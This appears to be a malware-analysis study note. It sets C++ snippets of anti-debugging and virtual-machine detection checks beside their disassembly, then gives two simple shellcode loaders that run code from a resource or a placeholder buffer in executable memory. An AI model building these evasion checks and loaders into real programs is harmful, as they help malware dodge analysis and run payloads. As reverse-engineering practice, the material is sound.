## Malware Techniques -- Code Snippets vs Assembly
The program that I took these code snippets from was my own creation. I wanted to practice identifying and bypassing various anti-analysis checks that I've seen in malware. The way that I designed the program to work is if any of the checks failed, it would return a 1 instead of a 0. If it returned 1, it would increment a total counter. If the result of the counter was anything other than a 0 by the end, the analyst has failed to bypass the checks and it would show the error message. I wanted to mention this in case any readers had any questions regarding the int function types and return values.

---

### Anti-Analyis

#### IsDebuggerPresent
<table>
<tr>
<th> Source </th>
<th> Assembly </th>
</tr>
<tr>
<td>

```C++
int basicDebugger()
{
	BOOL basicDebugResult = IsDebuggerPresent();
	if (basicDebugResult == TRUE) {
		return 1;
	}
	return 0;
}
```

</td>
<td>	

![IsDebuggerPresent](Pictures/IsDebuggerPresent.png)

</td>
</tr>
</table>
	
---

#### Total RAM Amount
```C++
int ramCheck()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);
	int ramResult = (float)statex.ullTotalPhys / (1024 * 1024 * 1024);
	if (ramResult < 6) {
		return 1;
	}
	return 0;
}
```
<br/>

![TotalRAM](Pictures/ramCheck.png)

<br/>

---

#### Total Processor Check
```C++
int procCheck()
{
	unsigned logicalCpuCount;
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	logicalCpuCount = systemInfo.dwNumberOfProcessors;
	if (logicalCpuCount < 4) {
		return 1;
	}
	return 0;
}
```
<br/>

![TotalProc](Pictures/procCheck.png)

<br/>

---

#### Total Disk Size Check
```C++
int diskCheck()
{
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	
	if (diskSizeGB < 250) {
		return 1;
	}

	return 0;
}
```

<br/>

![Disk Check](Pictures/diskCheck.png)

<br/>

---

#### GetTickCount
```C++
int getTickCheck()
{
	unsigned int timestampOne = GetTickCount();
	OutputDebugString(L"Debug");
	unsigned int timestampTwo = GetTickCount();
	unsigned int difference = timestampTwo - timestampOne;
	if (difference > 1000) {
		return 1;
	}
	return 0;
}
```

<br/>

![GetTickCount](Pictures/GetTickCount.png)

<br/>

---

#### CheckRemoteDebuggerPresent
```C++
int advancedDebug()
{
	BOOL isRemoteDebuggerPresent = FALSE;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);

	if (isRemoteDebuggerPresent == TRUE) {
		return 1;
	}
	return 0;
}
```

<br/>

![CheckRemoteDebuggerPresent](Pictures/CheckRemoteDebuggerPresent.png)

<br/>

---

#### VirtualBox Check
```C++
int vboxCheck()
{
	// Look for VirtualBox files
	WIN32_FIND_DATAW findFileData;
	if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return 1;

	// Look for VirtualBox registry keys
	HKEY hkResult;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return 1;

	return 0;
}
```

<br/>

![VirtualBox Check](Pictures/vboxCheck.png)

<br/>

---

#### VMware Check
```C++
int vmWareCheck()
{
	// Look for VMware files
	WIN32_FIND_DATAW findFileData;
	if (FindFirstFileW(L"C:\\Windows\\System32\\drivers\\vmmouse.sys", &findFileData) != INVALID_HANDLE_VALUE) return 1;

	// Look for VMware registry keys
	HKEY hkResult;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return 1;

	return 0;
}
```

<br/>

![VMware Check](Pictures/vmwareCheck.png)

<br/>

---

---

### Launching Payloads

#### Grabbing Payload from Resources
```C++
int main()
{
    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(101), L"calc_bin");
    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);

    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcodeResouceData, shellcodeSize);
    ((void(*)())exec)();

    return  0;
}
```

<br/>

![Resource Loader](Pictures/resourceLoader.png)

<br/>

---

#### Basic Shellcode Execution
*Note that this is also useful from the malware analysis side to load identified shellcode*

```C++
int main()
{
    unsigned char buf[] =
        "[SHELLCODE \xBYTES GO HERE]";

    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
}
```

<br/>

![BasicShellcodeExec](Pictures/BasicShellcodeExec.png)

<br/>

---

